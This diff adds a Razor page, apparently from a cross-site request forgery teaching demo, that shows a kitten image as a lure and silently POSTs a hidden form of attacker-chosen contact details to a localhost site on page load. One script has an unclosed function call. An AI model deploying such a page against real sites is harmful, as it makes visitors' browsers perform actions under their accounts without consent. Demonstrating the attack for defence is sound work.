@@ -1,0 +1,55 @@
+﻿@page
+@model EvilSite.Pages.CuteCatModel
+
+@{
+    Layout = null;
+}
+
+<script>
+    function Submit(e) {
+        let request = new XMLHttpRequest();
+
+        request.open('POST', "https://localhost:7039/NewContact", true);
+
+        request.onload = function () {
+            console.log(request.responseText);
+        };
+
+        request.onerror = function () {
+            console.log(request.responseText);
+        };
+
+        request.send(new FormData(e.target));
+        e.preventDefault();
+    }
+
+    document.addEventListener("DOMContentLoaded", (e) => {
+        document.getElementById("form").addEventListener("submit",Submit);
+    }
+</script>
+
+<img src="https://placekitten.com/300/300" alt="Cute kitten" />
+<form id="form">
+    <input type="hidden" name="Contact.Name" value="EvilHacker">
+    <input type="hidden" name="Contact.Phone" value="9696969696">
+    <input type="hidden" name="Contact.Email" value="Hacker@example.com">
+</form>
+
+<script>
+     console.log("Submit");
+     let request = new XMLHttpRequest();
+
+     let target = document.getElementById("form");
+
+     request.open('POST', "https://localhost:7039/NewContact", true);
+
+     request.onload = function () {
+         console.log(request.responseText);
+     };
+
+     request.onerror = function () {
+         console.log(request.responseText);
+     };
+
+     request.send(new FormData(target));
+</script>
